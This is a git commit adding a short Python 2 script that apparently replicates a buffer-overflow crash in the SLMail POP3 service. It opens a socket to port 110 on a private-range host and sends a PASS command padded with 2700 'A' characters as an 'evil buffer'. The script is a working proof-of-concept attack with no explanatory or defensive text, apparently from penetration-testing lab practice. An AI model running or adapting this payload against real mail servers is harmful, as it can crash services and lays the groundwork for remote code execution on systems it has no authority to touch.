e565ff9ed691248940da6820501df140f1732449
Gandosha <Gandosha@users.noreply.github.com>
2018-01-26 09:34:21 -0500

    Add files via upload

---
+++ slmail_pop3_replicated_crash.py
@@ -0,0 +1,17 @@
+#!/usr/bin/python
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+buffer = "A"*2700
+
+
+try:
+	print "\Sending evil buffer..."
+	s.connect(('10.11.13.120',110))
+	data = s.recv(1024)
+	s.send('USER username' +'\r\n')
+	data = s.recv(1024)
+	s.send('PASS ' + buffer + '\r\n')
+	print "\nDone!."
+except:
+	print "Could not connect to POP3!"
